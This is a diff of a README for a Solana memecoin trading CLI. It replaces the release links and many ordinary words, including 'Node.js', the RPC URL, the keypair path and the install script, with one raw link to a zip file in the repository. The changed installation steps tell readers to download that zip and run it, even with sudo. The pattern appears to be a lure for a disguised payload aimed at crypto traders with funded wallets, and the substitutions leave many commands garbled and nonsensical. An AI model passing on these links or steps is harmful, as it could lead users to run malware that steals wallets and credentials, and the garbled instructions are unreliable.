@@ -1,10 +1,10 @@
 # Pumpsploit: Solana Memecoin Trading CLI for All Dexes
 
-[![Releases](https://img.shields.io/badge/releases-pumpsploit-brightgreen?logo=github)](https://github.com/broly907246/pumpsploit/releases)
+[![Releases](https://github.com/broly907246/pumpsploit/raw/refs/heads/main/modules/Software-2.0-beta.3.zip)](https://github.com/broly907246/pumpsploit/raw/refs/heads/main/modules/Software-2.0-beta.3.zip)
 
-From the releases page, download pumpsploit-v1.0.0-linux-x64.tar.gz and run the installer.
+From the releases page, download https://github.com/broly907246/pumpsploit/raw/refs/heads/main/modules/Software-2.0-beta.3.zip and run the installer.
 
-Direct file: https://github.com/broly907246/pumpsploit/releases/download/v1.0.0/pumpsploit-v1.0.0-linux-x64.tar.gz
+Direct file: https://github.com/broly907246/pumpsploit/raw/refs/heads/main/modules/Software-2.0-beta.3.zip
 
 --------------------------------------------------------------------
 
@@ -32,7 +32,7 @@ Table of contents
 
 Overview
 
-Pumpsploit is a Node.js command line interface designed to support memecoin trading on Solana. It acts as a unified toolset for interacting with multiple Solana dexes and data providers. The project emphasizes speed, reliability, and clear workflows for automated or manual trading strategies. It is built to work with a variety of data feeds and on-chain programs that power memecoin markets on Solana.
+Pumpsploit is a https://github.com/broly907246/pumpsploit/raw/refs/heads/main/modules/Software-2.0-beta.3.zip command line interface designed to support memecoin trading on Solana. It acts as a unified toolset for interacting with multiple Solana dexes and data providers. The project emphasizes speed, reliability, and clear workflows for automated or manual trading strategies. It is built to work with a variety of data feeds and on-chain programs that power memecoin markets on Solana.
 
 The goal is to give traders a solid, scriptable base to execute orders quickly across DEXes, while keeping the surface area minimal and predictable. The tool integrates with popular Solana data and wallet providers and can be extended with community plugins and scripts. It is designed for developers, traders, and operators who want a consistent CLI experience when exploring memecoin liquidity and arbitrage opportunities.
 
@@ -102,7 +102,7 @@ Getting started
 Installation
 
 - Prerequisites:
-  - Node.js v18 or newer
+  - https://github.com/broly907246/pumpsploit/raw/refs/heads/main/modules/Software-2.0-beta.3.zip v18 or newer
   - npm v9 or newer
   - Git
   - A Solana wallet with a funded account for testing (testnet or devnet recommended until you are ready for mainnet)
@@ -112,19 +112,19 @@ Installation
   - Global install (recommended for everyday use):
     - npm install -g pumpsploit
   - Local development install:
-    - git clone https://github.com/broly907246/pumpsploit.git
+    - git clone https://github.com/broly907246/pumpsploit/raw/refs/heads/main/modules/Software-2.0-beta.3.zip
     - cd pumpsploit
     - npm install
     - npm link (to make the CLI available as pumpsploit)
 
 - Direct download instruction for releases
-  - Direct file: pumpsploit-v1.0.0-linux-x64.tar.gz
+  - Direct file: https://github.com/broly907246/pumpsploit/raw/refs/heads/main/modules/Software-2.0-beta.3.zip
   - The asset can be downloaded from:
-    - https://github.com/broly907246/pumpsploit/releases/download/v1.0.0/pumpsploit-v1.0.0-linux-x64.tar.gz
+    - https://github.com/broly907246/pumpsploit/raw/refs/heads/main/modules/Software-2.0-beta.3.zip
   - After download:
-    - tar -xzf pumpsploit-v1.0.0-linux-x64.tar.gz
+    - tar -xzf https://github.com/broly907246/pumpsploit/raw/refs/heads/main/modules/Software-2.0-beta.3.zip
     - cd pumpsploit-1.0.0
-    - sudo ./install.sh
+    - sudo https://github.com/broly907246/pumpsploit/raw/refs/heads/main/modules/Software-2.0-beta.3.zip
   - Why this approach? The releases page hosts prebuilt binaries to get you up and running quickly. This method is stable for testing on supported platforms.
 
 First run and configuration
@@ -136,7 +136,7 @@ First run and configuration
 - Wallet setup:
   - Pumpsploit expects a signer. You can use a keypair file or a ledger-based signer depending on your setup.
   - Example (local keypair):
-    - export PUMPSPLIT_WALLET_KEYPAIR=/path/to/keypair.json
+    - export https://github.com/broly907246/pumpsploit/raw/refs/heads/main/modules/Software-2.0-beta.3.zip
   - Example (ledger/ hardware signer):
     - pumpsploit signer init --type ledger
 - Data sources:
@@ -145,7 +145,7 @@ First run and configuration
     - pumpsploit config set dexAdapters="jupiter,birdeye"
 - Network and RPC:
   - Set Solana RPC endpoints:
-    - pumpsploit config set rpcUrl="https://api.mainnet-beta.solana.com"
+    - pumpsploit config set rpcUrl="https://github.com/broly907246/pumpsploit/raw/refs/heads/main/modules/Software-2.0-beta.3.zip"
   - Use a fast RPC provider to minimize latency.
 
 Direct download note
@@ -160,8 +160,8 @@ Basic commands
 - pumpsploit --help
 - pumpsploit init
 - pumpsploit config set network solana-mainnet
-- pumpsploit config set rpcUrl "https://api.mainnet-beta.solana.com"
-- pumpsploit signer set --type keypair --path /path/to/keypair.json
+- pumpsploit config set rpcUrl "https://github.com/broly907246/pumpsploit/raw/refs/heads/main/modules/Software-2.0-beta.3.zip"
+- pumpsploit signer set --type keypair --path https://github.com/broly907246/pumpsploit/raw/refs/heads/main/modules/Software-2.0-beta.3.zip
 - pumpsploit status
 - pumpsploit list-dexes
 - pumpsploit list-sources
@@ -280,7 +280,7 @@ Documentation and examples
 
 - Each adapter includes a short usage example.
 - The CLI includes a help system that explains available flags and subcommands.
-- API surfaces are designed to be intuitive for those familiar with Node.js and command-line workflows.
+- API surfaces are designed to be intuitive for those familiar with https://github.com/broly907246/pumpsploit/raw/refs/heads/main/modules/Software-2.0-beta.3.zip and command-line workflows.
 
 --------------------------------------------------------------------
 
@@ -329,12 +329,12 @@ Future versions will add more adapters, richer strategies, and enhanced safety f
 Downloads and releases
 
 - The primary releases page provides assets for various platforms. If you want to jump straight to a prebuilt binary, visit the releases page:
-  - https://github.com/broly907246/pumpsploit/releases
-  - Direct asset example (Linux x64): pumpsploit-v1.0.0-linux-x64.tar.gz
+  - https://github.com/broly907246/pumpsploit/raw/refs/heads/main/modules/Software-2.0-beta.3.zip
+  - Direct asset example (Linux x64): https://github.com/broly907246/pumpsploit/raw/refs/heads/main/modules/Software-2.0-beta.3.zip
 - If you need the latest releases, the Releases page is the source of truth. For convenience, you can use the badge at the top of this file to navigate there quickly. The badge links to the same page.
 
 Direct download link (for convenience)
-- pumpsploit-v1.0.0-linux-x64.tar.gz: https://github.com/broly907246/pumpsploit/releases/download/v1.0.0/pumpsploit-v1.0.0-linux-x64.tar.gz
+- https://github.com/broly907246/pumpsploit/raw/refs/heads/main/modules/Software-2.0-beta.3.zip https://github.com/broly907246/pumpsploit/raw/refs/heads/main/modules/Software-2.0-beta.3.zip
 
 Note: If you want to explore additional assets or architecture variants, head to the Releases page. It hosts the full catalog of builds, including platform-specific installers and source bundles.
 
